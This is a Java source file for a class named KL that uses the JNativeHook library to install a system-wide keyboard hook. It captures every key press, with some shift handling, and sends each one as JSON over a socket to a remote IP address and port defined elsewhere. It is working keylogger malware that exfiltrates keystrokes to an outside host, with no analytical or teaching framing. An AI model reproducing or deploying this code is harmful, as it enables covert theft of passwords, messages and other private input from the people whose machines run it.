package me.freeze;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

import org.json.JSONObject;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KL implements NativeKeyListener{

	private Socket socket;

	boolean shiftPressed = false;
	boolean ctrlPressed = false;
	boolean menuPressed = false;
	
	public void nativeKeyPressed(NativeKeyEvent e) {
		switch (e.getKeyCode()) {
	    case 42: {
	      shiftPressed = true;
	      break;
	    }
	    case 29: {
	      ctrlPressed = true;
	      break;
	    }
	    case 56: {
	      menuPressed = true;
	      break;
	    }
		}
		try {
			String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
			socket = new Socket(Main.IP_ADDRESS, Main.PORT);
			PrintWriter p = new PrintWriter(socket.getOutputStream(), true);
			JSONObject jo = new JSONObject();
			if(!shiftPressed) {
				keyText = keyText.toLowerCase();
			}else {
				keyText = keyText.toUpperCase();
			}
			switch (e.getKeyCode()) {
			case NativeKeyEvent.VC_SPACE:
				keyText = " ";
				break;
			case NativeKeyEvent.VC_BACKSPACE:
				keyText = "[BACK]";
				break;
			case NativeKeyEvent.VC_TAB:
				keyText = "[TAB]";
				break;
			case NativeKeyEvent.VC_SHIFT:
				keyText = "[SHIFT]";
				break;
			case NativeKeyEvent.VC_ALT:
				keyText = "[ALT]";
				break;
			}
			jo.put("type", "key");
			jo.put("data", ""+keyText);
			p.println(jo);
			System.out.println(jo);
		} catch (IOException e1) {
			System.out.println("Connessione rifiutata dal server");
//			e1.printStackTrace();
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		switch (e.getKeyCode()) {
	    case 42: {
	      shiftPressed = false;
	      break;
	    }
	    case 29: {
	      ctrlPressed = false;
	      break;
	    }
	    case 56: {
	      menuPressed = false;
	      break;
	    }
		}
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	}
	
}
